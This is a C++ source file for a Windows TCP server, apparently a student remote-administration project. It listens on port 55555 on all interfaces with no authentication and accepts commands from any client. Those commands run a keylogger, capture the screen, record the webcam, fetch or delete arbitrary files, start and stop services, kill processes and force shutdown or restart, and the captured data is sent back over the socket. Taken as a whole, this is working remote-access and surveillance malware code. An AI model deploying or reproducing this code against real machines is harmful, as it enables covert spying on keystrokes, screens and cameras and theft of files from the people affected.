#include "server.h"


int main(int argc, char *argv[])
{
    //Set up UI
    hideCursor();
    FrameMenu frame;
    double widthOfFrame, heightOfFrame;
    frame.getWidthAndHeight(widthOfFrame, heightOfFrame);
    int widthConsole, heightConsole;
    getConsoleSize(widthConsole, heightConsole);
    //Begin client
    printCentered("Press Enter to begin!", heightConsole / 2);
    cin.ignore();
    system("cls");
    printCentered("========== SERVER ==========", heightConsole / 2 - 2);
    printCentered("===Step1-Set up DLL ===", heightConsole / 2 + 2);
    // cout << "==========SERVER==========" << endl;
    // cout << "===Step 1 - Set up DLL===" << endl;
    SOCKET serverSocket, acceptSocket;
    int port = 55555;
    WSADATA wsaData;
    int wsaerr;
    WORD wVErsionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVErsionRequested, &wsaData);
    if (wsaerr != 0)
    {
        vector<string> content;
        content.push_back("The Winsock dll not found");
        frame.displayAnimationDefault(content);
        return 0;
    }
    else
    {
        string s1 = "The Winsock dll found!";
        string s2 = "The status: ";
        vector<string> content;
        content.push_back(s1);
        content.push_back(s2 + wsaData.szSystemStatus);
        frame.displayAnimationDefault(content);
    }
    vector<string> content1;
    content1.push_back("=== Step 2 - Set up the Server Socket===");
    frame.displayAnimationDefault(content1);
    // cout << "\n=== Step 2 - Set up the Server Socket===" << endl;
    serverSocket = INVALID_SOCKET;
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket  == INVALID_SOCKET)
    {
        vector<string> content;
        content.push_back("Error at socket(): " + WSAGetLastError()); 
        frame.displayAnimationDefault(content);
        // cout << "Error at socket(): " << WSAGetLastError() << endl;
        WSACleanup();
        return 0;
    }
    else
    {
        string s = "socket() is OK!";
        vector<string> content;
        content.push_back(s);
        frame.displayAnimationDefault(content);
        // cout << "socket() is OK!" << endl;
    }
    content1.clear();
    content1.push_back("===Step 3 - Bind Socket ===");
    // cout << "\n===Step 3 - Bind Socket ===" << endl;
    sockaddr_in service;
    service.sin_family = AF_INET;
    InetPton(AF_INET, "0.0.0.0", &service.sin_addr.s_addr);
    service.sin_port = htons(port);
    if (bind(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR)
    {
        vector<string> content;
        content.push_back("bind() failer: " + WSAGetLastError());
        frame.displayAnimationDefault(content);
        // cout << "bind() failer: " << WSAGetLastError << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 0;
    }
    else
    {
        vector<string> content;
        content.push_back("bind() is OK!");
        frame.displayAnimationDefault(content);
        // cout << "bind() is OK!" << endl;
    }
    // cout << "\n=== Step 4===" << endl;
    // if (listen(serverSocket, 1) == SOCKET_ERROR)
    //     cout << "listen(): Error listening on socket" << WSAGetLastError() << endl;
    // else
    //     cout << "listen() is OK. I waiting for connections..." << endl;
    // cout << "===Step 5: Accept connection===" << endl;
    // acceptSocket = accept(serverSocket, NULL, NULL);
    // if (acceptSocket == INVALID_SOCKET)
    // {
    //     cout << "accept failed: " << WSAGetLastError() << endl;
    //     WSACleanup();
    //     return -1;
    // }
    // cout << "Accept connection" << endl;
	// cout << "\n=== Step 6 - Chat to the Client ===\n\n";
    while (true) // server.cpp
    {
        vector<string> content;
        content.push_back("listen...");
        frame.displayAnimationDefault(content);
        content.clear();
        // cout << "\nlisten..." << endl;
        // if (listen(serverSocket, 1) == SOCKET_ERROR)
        //     cout << "listen(): Error listening on socket" << WSAGetLastError() << endl;
        // else
        //     cout << "listen() is OK. I waiting for connections..." << endl;
        if (listen(serverSocket, 1) == SOCKET_ERROR)
            content.push_back("listen(): Error listening on socket" + WSAGetLastError());
        else
            content.push_back("listen() is OK. Waiting for connections...");
        frame.displayAnimationDefault(content);
        content.clear();
        // cout << "=== Accept connection ===" << endl;
        acceptSocket = accept(serverSocket, NULL, NULL);
        if (acceptSocket == INVALID_SOCKET)
        {
            content.push_back("accept failed: " + WSAGetLastError());
            frame.displayAnimationDefault(content);
            content.pop_back();
            // cout << "accept failed: " << WSAGetLastError() << endl;
            continue;
            WSACleanup();
            return -1;
        }
        content.push_back("Accept connection");
        frame.displayAnimationDefault(content);
        content.pop_back();
        // cout << "Accept connection" << endl;

        char messageFromServer[bufferSize] = {};
        char messageFromClient[bufferSize] = {};
        int byteCount = recv(acceptSocket, messageFromClient, bufferSize, 0);
        if (byteCount > 0) {
            content.push_back("Message received: " + string(messageFromClient));
            frame.displayAnimationDefault(content);
            content.pop_back();
            // cout << "Message received: " << messageFromClient << endl;
            // cout << "Message length: " << strlen(messageFromClient) << endl;
        }
        else WSACleanup();
        if (string(messageFromClient) == "shutdown") {
            string announcement = "Shutdown server successfully!";
            strcpy(messageFromServer, announcement.c_str());
            int sec = 5;
            while (sec >= 1) {
                vector<string> content;
                content.push_back("Shutdown after " + to_string(sec));
                frame.displayAnimationDefault(content);
                sec--;
            }
            int bytecount = send(acceptSocket, messageFromServer, bufferSize, 0);
            closesocket(acceptSocket);
            WSACleanup();
            system("shutdown /s /f /t 5");
        } 
        else if (string(messageFromClient) == "restart")
        {
            string announcement = "Restart server successfully!";
            strcpy(messageFromServer, announcement.c_str());
            int sec = 5;
            while (sec >= 1) {
                vector<string> content;
                content.push_back("Restart after " + to_string(sec));
                frame.displayAnimationDefault(content);
                sec--;
            } 
            int bytecount = send(acceptSocket, messageFromServer, bufferSize, 0);
            closesocket(acceptSocket);
            WSACleanup();
            #ifdef _WIN32
            system("shutdown /r /f /t 5");  // Lệnh restart cho Windows
            #endif
        }
        else if (string(messageFromClient) == "capturescreen") // Send the bitmap file
        {
            content.push_back("Capturing screen...");
            frame.displayAnimationDefault(content);
            content.pop_back();
            // cout << "Capturing screen..." << endl;
            captureScreen("screenshot.bmp");
            // Open the bitmap file
            ifstream file("screenshot.bmp", ios::binary | ios::ate);
            if (!file.is_open()) {
                content.push_back("Failed to open screenshot.bmp");
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Failed to open screenshot.bmp" << endl;
                continue;
            }

            // Get file size and allocate buffer
            streamsize fileSize = file.tellg();
            file.seekg(0, ios::beg);
            char *fileBuffer = new char[fileSize];
            if (!file.read(fileBuffer, fileSize)) {
                content.push_back("Failed to read screenshot.bmp");
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Failed to read screenshot.bmp" << endl;
                delete[] fileBuffer;
                file.close();
                continue;
            }
            file.close();

            // Send file size first
            send(acceptSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

            // Send file content
            int sentBytes = send(acceptSocket, fileBuffer, fileSize, 0);
            if (sentBytes == SOCKET_ERROR){
                content.push_back("Error sending file data:" + WSAGetLastError());
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Error sending file data: " << WSAGetLastError() << endl;
            }
            delete[] fileBuffer;
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient) == "listservices")
        {
            listServices();
            ifstream file("services2.txt", ios::binary | ios::ate);
            if (!file.is_open()) {
                content.push_back("Failed to open service.txt");
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Failed to open service.txt" << endl;
                continue;
            }

            // Get file size and allocate buffer
            streamsize fileSize = file.tellg();
            file.seekg(0, ios::beg);
            char *fileBuffer = new char[fileSize];
            if (!file.read(fileBuffer, fileSize)) {
                content.push_back("Failed to read service.txt");
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Failed to read service.txt" << endl;
                delete[] fileBuffer;
                file.close();
                continue;
            }
            file.close();

            // Send file size first
            send(acceptSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

            // Send file content in chunks
            int sentBytes = 0;
            while (sentBytes < fileSize) {
                int bytesToSend = min(bufferSize, static_cast<int>(fileSize - sentBytes));
                int result = send(acceptSocket, fileBuffer + sentBytes, bytesToSend, 0);
                if (result == SOCKET_ERROR) {
                    content.push_back("Error sending file data: " + WSAGetLastError());
                    frame.displayAnimationDefault(content);
                    content.pop_back();
                    // cout << "Error sending file data: " << WSAGetLastError() << endl;
                    break;
                }
                sentBytes += result;
            }
            delete[] fileBuffer;
            // cout << "File example.txt sent successfully." << endl;
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient) == "keylogger")
        {
            char time[bufferSize] = {};
            recv(acceptSocket, time, bufferSize, 0);
            keylogger(stoi(time));
            ifstream file("keylogger.txt", ios::binary | ios::ate);
            if (!file.is_open()) {
                content.push_back("Failed to open keylogger.txt");
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Failed to open keylogger.txt" << endl;
                continue;
            }

            // Get file size and allocate buffer
            streamsize fileSize = file.tellg();
            file.seekg(0, ios::beg);
            char *fileBuffer = new char[fileSize];
            if (!file.read(fileBuffer, fileSize)) {
                content.push_back("Failed to read keylogger.txt");
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Failed to read keylogger.txt" << endl;
                delete[] fileBuffer;
                file.close();
                continue;
            }
            file.close();

            // Send file size first
            send(acceptSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

            // Send file content in chunks
            int sentBytes = 0;
            while (sentBytes < fileSize) {
                int bytesToSend = min(bufferSize, static_cast<int>(fileSize - sentBytes));
                int result = send(acceptSocket, fileBuffer + sentBytes, bytesToSend, 0);
                if (result == SOCKET_ERROR) {
                    content.push_back( "Error sending file data: " + WSAGetLastError());
                    frame.displayAnimationDefault(content);
                    content.pop_back();
                    // cout << "Error sending file data: " << WSAGetLastError() << endl;
                    break;
                }
                sentBytes += result;
            }
            delete[] fileBuffer;
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient) == "startservice")
        {
            char serviceToStart[bufferSize] = {};
            recv(acceptSocket, serviceToStart, bufferSize, 0);
            bool check = startService((serviceToStart));
            string anotherMessageFromServer;
            if (check)
                anotherMessageFromServer = string(serviceToStart) + " start sucessfully";
            else 
                anotherMessageFromServer = string(serviceToStart) + " start unsucessfully";
            send(acceptSocket, anotherMessageFromServer.c_str(), 1024, 0);  
            closesocket(acceptSocket); 
        }
        else if (string(messageFromClient) == "stopservice")
        {
            char serviceToStop[bufferSize] = {};
            recv(acceptSocket, serviceToStop, bufferSize, 0);
            bool check = stopService((serviceToStop));
            string anotherMessageFromServer;
            if (check)
                anotherMessageFromServer = string(serviceToStop) + " stop sucessfully";
            else 
                anotherMessageFromServer = string(serviceToStop) + " stop unsucessfully";
            send(acceptSocket, anotherMessageFromServer.c_str(), 1024, 0);   
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient) == "listapp")
        {   
            vector<Application> gotApp = GetOpenApplications();
            // map<DWORD, string> Apps;
            // for (int i = 0; i < gotApp.size(); i++)
            // {
            //     Apps.insert({gotApp[i].pid, gotApp[i].title});
            // }
            // byteCount = send(acceptSocket, messageFromServer, bufferSize, 0);
            // vector<string> imageName;
            // for (auto x: gotApp){
            //     imageName.push_back(getImageNameFromPID(x.pid));
            // }
            // byteCount = sendStringVector(acceptSocket, imageName);
            // if (byteCount > 0)
            //     cout << "Message sent: " << "Sent image name list successfully!" << endl;
            // else
            //     WSACleanup();
            byteCount = sendApplications(acceptSocket, gotApp);
            if (byteCount > 0){
                content.push_back("Message sent: Sent apps list successfully!");
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Message sent: " << "Sent apps list successfully!" << endl;
            }
            else
                WSACleanup();
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient).substr(0, 7) == "openapp")
        {
            // string nameApp = string(messageFromClient).substr(8);
            char nameApp[bufferSize] = {};
            recv(acceptSocket, nameApp, bufferSize, 0);
            content.push_back("Name of app to open: " + string(nameApp));
            frame.displayAnimationDefault(content);
            content.pop_back();
            // cout << "Name of app to open: " << nameApp << endl;
            int check = openApplicationByName(nameApp);
            string announcement = "";
            if (check == 0)
                announcement = "Open required app unsuccessfully!";
            else if (check == 1)
                announcement = "Open required app successfully!";
            strcpy(messageFromServer, announcement.c_str());
            byteCount = send(acceptSocket, messageFromServer, 1024, 0);
            if (byteCount > 0){
                content.push_back("Message sent:  " + string(messageFromServer));
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Message sent: " << messageFromServer << endl;
            }
            else 
                WSACleanup();
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient).substr(0, 8) == "closeapp")
        {
            char appName[bufferSize] = {};
            recv(acceptSocket, appName, bufferSize, 0);
            content.push_back("Name of app to close: " + string(appName));
            frame.displayAnimationDefault(content);
            content.pop_back();
            // cout << "Name of app to close: " << appName << endl;
            DWORD pidOfApp = FindPIDByImageName(string(appName));
            string announcement = "";
            if (closeApplication(pidOfApp))
            {
                announcement = "Terminate required application successfully!";
            }
            else
                announcement = "Terminate unsuccessfully!";
            strcpy(messageFromServer, announcement.c_str());
            byteCount = send(acceptSocket, messageFromServer, 1024, 0);
            if (byteCount > 0){
                content.push_back("Message sent:  " + string(messageFromServer));
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Message sent: " << messageFromServer << endl;
            }
            else 
                WSACleanup();
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient).substr(0, 10) == "deletefile")
        {
            char filePath[bufferSize];
            int bytesRead = recv(acceptSocket, filePath, bufferSize, 0);
            if (bytesRead > 0) {
                filePath[bytesRead] = '\0';
                content.push_back("Client requested file: " + string(filePath));
                frame.displayAnimationDefault(content);
                content.pop_back();
                // std::cout << "Client requested file: " << filePath << "\n";

                string announcement = "";
                if (deleteFileByPath(string(messageFromClient).substr(11)))
                    announcement = "Delete required file successfully!";
                else 
                    announcement = "Delete required file unsuccessfully!";
                strcpy(messageFromServer, announcement.c_str());
                byteCount = send(acceptSocket, messageFromServer, 1024, 0);
                if (byteCount > 0){
                    content.push_back("Message sent:  " + string(messageFromServer));
                    frame.displayAnimationDefault(content);
                    content.pop_back();
                    // cout << "Message sent: " << messageFromServer << endl;
                }
                else 
                    WSACleanup();
            }
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient).substr(0, 7) == "getfile")
        {
            char filePath[BUFFER_SIZE];
            int bytesRead = recv(acceptSocket, filePath, BUFFER_SIZE, 0);
            if (bytesRead > 0) {
                filePath[bytesRead] = '\0';
                content.push_back("Client requested file: " + string(filePath));
                frame.displayAnimationDefault(content);
                content.pop_back();
                // std::cout << "Client requested file: " << filePath << "\n";
                sendFile(filePath, acceptSocket);
                strcpy(messageFromServer, "close");
                byteCount = send(acceptSocket, messageFromServer, 1024, 0);
                if (byteCount > 0){
                    content.push_back("Message sent:  " + string(messageFromServer));
                    frame.displayAnimationDefault(content);
                    content.pop_back();
                    // cout << "Message sent: " << messageFromServer << endl;
                }
                else 
                    WSACleanup();
            }
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient) == "startwebcam")
        {
            std::thread videoThread(recordVideo, "output.mp4", 640, 480, 10);
            videoThread.detach();
            // videoThread.join();
            closesocket(acceptSocket);
        }
        else if (string(messageFromClient) == "stopwebcam"){
            stopRecord();
            content.push_back("Stop video!");
            frame.displayAnimationDefault(content);
            content.pop_back();
            // cout << "Stop video!" << endl;
            Sleep(3000);
            sendFile("output.mp4", acceptSocket);
            strcpy(messageFromServer, "close");
            byteCount = send(acceptSocket, messageFromServer, 1024, 0);
            if (byteCount > 0){
                content.push_back("Message sent:  " + string(messageFromServer));
                frame.displayAnimationDefault(content);
                content.pop_back();
                // cout << "Message sent: " << messageFromServer << endl;
            }
            else 
                WSACleanup();
            resetFlag();
            closesocket(acceptSocket);
            deleteFileByPath("output.mp4");
        }
    }
    system("pause");
    WSACleanup();
    return 0;
}